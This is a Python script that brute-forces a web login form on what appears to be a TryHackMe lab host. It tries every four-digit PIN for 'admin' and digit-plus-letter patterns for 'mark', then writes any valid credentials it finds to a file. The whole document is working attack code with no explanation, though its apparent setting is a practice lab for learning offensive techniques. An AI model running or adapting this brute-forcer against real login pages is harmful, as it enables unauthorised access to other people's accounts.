#---Imports---#
import requests
from time import sleep
import string
bgreen = "\033[92m"
reset = "\033[0m"
red = "\033[31m"

def exploit():
    url = "http://python.thm/labs/lab1/"
    
    usernames = ["admin", "mark"]
    for x in usernames:
        if x == "admin":
            passwords = [str(i).zfill(4) for i in range(10000)]
        elif x == "mark":
            passwords = [f"{str(i).zfill(3)}{c}" for i in range(1000) for c in string.ascii_uppercase]
        for d in passwords:
            data = {
                    "username": x,
                    "password": d,
                    }
            r = requests.post(url=url, data=data)
            if "Invalid" in r.text:
                    print(f"{red}[-] {x}:{d} is incorrect trying again{reset}", end='\r',flush=True )
            elif "Invalid" not in r.text:
                    print(' ' * 80, end='\r')
                    print(f"{bgreen} [+] password found: {x}:{d} {reset} \n")
                    creds = f"{x}:{d}\n"
                    with open("creds.txt", "a") as file:
                        file.write(creds)
                    sleep(0.5)
                    break
            else:
                    print(f"{red}[-]No vaid Password found for {x}")
exploit()
